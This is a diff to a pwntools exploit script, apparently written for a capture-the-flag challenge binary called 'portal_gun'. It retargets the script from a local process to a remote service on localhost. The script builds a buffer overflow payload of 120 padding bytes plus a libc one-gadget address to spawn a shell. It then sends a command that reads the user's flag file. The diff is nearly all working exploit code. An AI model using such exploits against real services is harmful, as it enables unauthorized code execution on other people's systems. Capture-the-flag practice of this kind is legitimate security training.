@@ -2,11 +2,11 @@ from pwn import *
 import time
 
 ip = "localhost"
-port = 10000
+port = 10002
 
-# r = remote(ip, port)
-r = process("./portal_gun", env = {"LD_PRELOAD": "./hook.so"})
-libc = ELF("./libc.so.6")
+r = remote(ip, port)
+# r = process("./portal_gun", env = {"LD_PRELOAD": "./hook.so"})
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
 context.arch = "amd64"
 
@@ -26,5 +26,8 @@ info("libc base: {}".format(hex(libc_base)))
 magic = libc_base + 0x10a38c
 payload = 'a' * 120 + flat(magic)
 r.sendlineafter("?", payload)
+
+time.sleep(0.5)
+r.sendline("cat /home/`whoami`/flag")
 
 r.interactive()
